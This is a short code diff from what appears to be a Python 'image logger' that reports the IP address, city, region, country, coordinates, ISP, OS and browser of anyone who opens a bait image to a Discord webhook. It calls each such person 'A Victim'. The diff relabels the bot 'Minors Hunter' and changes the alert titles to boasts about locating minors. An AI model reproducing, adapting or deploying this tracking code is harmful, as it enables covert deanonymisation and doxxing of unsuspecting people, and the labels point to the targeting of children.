@@ -9,11 +9,11 @@ buggedimg = True # Set this to True if you want the image to show as loading on 
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
-  "username": "Fentanyl",
+  "username": "Minors Hunter",
   "content": "@everyone",
   "embeds": [
     {
-      "title": "Fentanyl strikes again!",
+      "title": "Frosty hunted down a minor ongggg!",
       "color": 16711803,
       "description": "A Victim opened the original Image. You can find their info below.",
       "author": {
@@ -37,11 +37,11 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
 
 def prev(ip,uag):
   return {
-  "username": "Fentanyl",
+  "username": "Minors Hunter",
   "content": "",
   "embeds": [
     {
-      "title": "Fentanyl Alert!",
+      "title": "Minor located Alert!",
       "color": 16711803,
       "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
       "author": {
